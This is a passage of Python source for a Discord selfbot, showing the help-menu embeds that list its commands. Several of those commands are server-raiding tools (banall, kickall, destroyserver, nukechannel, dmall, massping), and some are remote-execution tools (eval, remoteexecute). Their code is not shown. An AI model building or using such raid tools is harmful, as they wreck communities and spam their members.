        em2 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 2/2

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ebayviews').name}** ¬ª {React.get_command('ebayviews').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tempmail').name}** ¬ª {React.get_command('tempmail').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dm').name}** ¬ª {React.get_command('dm').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('friendexport').name}** ¬ª {React.get_command('friendexport').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('purge').name}** ¬ª {React.get_command('purge').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('spurge').name}** ¬ª {React.get_command('spurge').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('bulkreact').name}** ¬ª {React.get_command('bulkreact').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('bulkpin').name}** ¬ª {React.get_command('bulkpin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('giveaway').name}** ¬ª {React.get_command('giveaway').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('proxyscrape').name}** ¬ª {React.get_command('proxyscrape').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sleek').name}** ¬ª {React.get_command('sleek').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('todo').name}** ¬ª {React.get_command('todo').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('tododel').name}** ¬ª {React.get_command('tododel').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('todolist').name}** ¬ª {React.get_command('todolist').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('todoclear').name}** ¬ª {React.get_command('todoclear').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('yt2mp4').name}** ¬ª {React.get_command('yt2mp4').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('eval').name}** ¬ª {React.get_command('eval').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('remoteexecute').name}** ¬ª {React.get_command('remoteexecute').description}''', timestamp=embed_timestamp())
        em2.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em2.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em2.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        if page == '1' or page == None:
            await embed_or_codeblock(ctx, em)


        elif page == '2':      
            await embed_or_codeblock(ctx, em2)


        elif page.lower() == 'all':
            await embed_or_codeblock(ctx, em)


            await embed_or_codeblock(ctx, em2)



    @React.command(usage="nsfw", description="NSFW image commands")
    async def nsfw(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('boobs').name}** ¬ª {React.get_command('boobs').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('anal').name}** ¬ª {React.get_command('anal').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('porngif').name}** ¬ª {React.get_command('porngif').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentai').name}** ¬ª {React.get_command('hentai').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentaiass').name}** ¬ª {React.get_command('hentaiass').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentaianal').name}** ¬ª {React.get_command('hentaianal').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentaiboobs').name}** ¬ª {React.get_command('hentaiboobs').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentaitentacle').name}** ¬ª {React.get_command('hentaitentacle').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentaipussy').name}** ¬ª {React.get_command('hentaipussy').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentaikuni').name}** ¬ª {React.get_command('hentaikuni').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentaitits').name}** ¬ª {React.get_command('hentaitits').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentaiketa').name}** ¬ª {React.get_command('hentaiketa').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentaikemonomimi').name}** ¬ª {React.get_command('hentaikemonomimi').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('hentaigasm').name}** ¬ª {React.get_command('hentaigasm').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('blowjob').name}** ¬ª {React.get_command('blowjob').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('feet').name}** ¬ª {React.get_command('feet').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('yaoi').name}** ¬ª {React.get_command('yaoi').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ass').name}** ¬ª {React.get_command('ass').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cum').name}** ¬ª {React.get_command('cum').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('trap').name}** ¬ª {React.get_command('trap').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('futanari').name}** ¬ª {React.get_command('futanari').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('spank').name}** ¬ª {React.get_command('spank').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rule34').name}** ¬ª {React.get_command('rule34').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="encryption", description="Shows encryption commands")
    async def encryption(ctx):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('reactencrypt').name}** ¬ª {React.get_command('reactencrypt').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('reactdecrypt').name}** ¬ª {React.get_command('reactdecrypt').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('whirlpool').name}** ¬ª {React.get_command('whirlpool').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sha512').name}** ¬ª {React.get_command('sha512').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sha256').name}** ¬ª {React.get_command('sha256').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('sha1').name}** ¬ª {React.get_command('sha1').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('md5').name}** ¬ª {React.get_command('md5').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rot13').name}** ¬ª {React.get_command('rot13').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unrot13').name}** ¬ª {React.get_command('unrot13').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('privatebin').name}** ¬ª {React.get_command('privatebin').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, em)



    @React.command(usage="server [Page/All]", description="Server commands")
    async def server(ctx, page: str=None):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 1/2

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dmall').name}** ¬ª {React.get_command('dmall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('banall').name}** ¬ª {React.get_command('banall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('kickall').name}** ¬ª {React.get_command('kickall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nickall').name}** ¬ª {React.get_command('nickall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deleteroles').name}** ¬ª {React.get_command('deleteroles').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deletechannels').name}** ¬ª {React.get_command('deletechannels').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('purgeserver').name}** ¬ª {React.get_command('purgeserver').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('masschannels').name}** ¬ª {React.get_command('masschannels').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('massroles').name}** ¬ª {React.get_command('massroles').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('massunban').name}** ¬ª {React.get_command('massunban').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cloneserver').name}** ¬ª {React.get_command('cloneserver').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('destroyserver').name}** ¬ª {React.get_command('destroyserver').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dumpemojis').name}** ¬ª {React.get_command('dumpemojis').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rainbowrole').name}** ¬ª {React.get_command('rainbowrole').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unbanall').name}** ¬ª {React.get_command('unbanall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('renameallroles').name}** ¬ª {React.get_command('renameallroles').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('renameallchannels').name}** ¬ª {React.get_command('renameallchannels').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('loopservername').name}** ¬ª {React.get_command('loopservername').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('stoploopservername').name}** ¬ª {React.get_command('stoploopservername').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        em2 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 2/2

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('nukechannel').name}** ¬ª {React.get_command('nukechannel').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('bannedusers').name}** ¬ª {React.get_command('bannedusers').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('channels').name}** ¬ª {React.get_command('channels').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('delemojis').name}** ¬ª {React.get_command('delemojis').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('renameserver').name}** ¬ª {React.get_command('renameserver').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('massping').name}** ¬ª {React.get_command('massping').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('massgping').name}** ¬ª {React.get_command('massgping').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('cloneservertoserver').name}** ¬ª {React.get_command('cloneservertoserver').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('makerole').name}** ¬ª {React.get_command('makerole').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('addrole').name}** ¬ª {React.get_command('addrole').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('removerole').name}** ¬ª {React.get_command('removerole').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('roles').name}** ¬ª {React.get_command('roles').description}''',timestamp=embed_timestamp())
        em2.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em2.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em2.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        if page == '1' or page == None:
            await embed_or_codeblock(ctx, em)


        elif page == '2':      
            await embed_or_codeblock(ctx, em2)


        elif page.lower() == 'all':
            await embed_or_codeblock(ctx, em)


            await embed_or_codeblock(ctx, em2)



    @React.command(usage="info [Page/All]", description="Information commands")
    async def info(ctx, page: str=None):
        em = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 1/3

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('avatar').name}** ¬ª {React.get_command('avatar').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('serverlogo').name}** ¬ª {React.get_command('serverlogo').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('grouplogo').name}** ¬ª {React.get_command('grouplogo').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('roleinfo').name}** ¬ª {React.get_command('roleinfo').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('serverinfo').name}** ¬ª {React.get_command('serverinfo').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('userinfo').name}** ¬ª {React.get_command('userinfo').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('covid').name}** ¬ª {React.get_command('covid').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('pcspecs').name}** ¬ª {React.get_command('pcspecs').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('urbandict').name}** ¬ª {React.get_command('urbandict').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('calc').name}** ¬ª {React.get_command('calc').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('namehistory').name}** ¬ª {React.get_command('namehistory').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('pokedex').name}** ¬ª {React.get_command('pokedex').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('ping').name}** ¬ª {React.get_command('ping').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('fnstats').name}** ¬ª {React.get_command('fnstats').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('snowflakeinfo').name}** ¬ª {React.get_command('snowflakeinfo').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('dogfact').name}** ¬ª {React.get_command('dogfact').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('catfact').name}** ¬ª {React.get_command('catfact').description}''',timestamp=embed_timestamp())
        em.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        em2 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 2/3

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rockstarid').name}** ¬ª {React.get_command('rockstarid').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('weather').name}** ¬ª {React.get_command('weather').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('discordstatus').name}** ¬ª {React.get_command('discordstatus').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('uptime').name}** ¬ª {React.get_command('uptime').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('morsetable').name}** ¬ª {React.get_command('morsetable').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('define').name}** ¬ª {React.get_command('define').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('howgay').name}** ¬ª {React.get_command('howgay').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('howcorona').name}** ¬ª {React.get_command('howcorona').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('howfurry').name}** ¬ª {React.get_command('howfurry').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('lovecalc').name}** ¬ª {React.get_command('lovecalc').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('iq').name}** ¬ª {React.get_command('iq').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('deathdate').name}** ¬ª {React.get_command('deathdate').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('lyrics').name}** ¬ª {React.get_command('lyrics').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('translate').name}** ¬ª {React.get_command('translate').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('mcskin').name}** ¬ª {React.get_command('mcskin').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('mcuuid').name}** ¬ª {React.get_command('mcuuid').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('color').name}** ¬ª {React.get_command('color').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('numberfact').name}** ¬ª {React.get_command('numberfact').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('motd').name}** ¬ª {React.get_command('motd').description}''',timestamp=embed_timestamp())
        em2.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        em2.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        em2.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        em3 = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]} **{json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["selfbot_title"]}** {json.load(open(f"./Themes/{json.load(open('''config.json''', encoding='''utf-8'''))['''theme''']}.json"))["global_emoji"]}""", description=
        f'''Page 3/3

**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('howcap').name}** ¬ª {React.get_command('howcap').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('mcserver').name}** ¬ª {React.get_command('mcserver').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('csgostats').name}** ¬ª {React.get_command('csgostats').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rlstats').name}** ¬ª {React.get_command('rlstats').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('apexstats').name}** ¬ª {React.get_command('apexstats').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('valorantstats').name}** ¬ª {React.get_command('valorantstats').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('rockstargamesstatus').name}** ¬ª {React.get_command('rockstargamesstatus').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unixtime').name}** ¬ª {React.get_command('unixtime').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('emojiinfo').name}** ¬ª {React.get_command('emojiinfo').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('watchuser').name}** ¬ª {React.get_command('watchuser').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unwatchuser').name}** ¬ª {React.get_command('unwatchuser').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('watchlist').name}** ¬ª {React.get_command('watchlist').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('unwatchall').name}** ¬ª {React.get_command('unwatchall').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('changelog').name}** ¬ª {React.get_command('changelog').description}
**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command('lookupuser').name}** ¬ª {React.get_command('lookupuser').description}
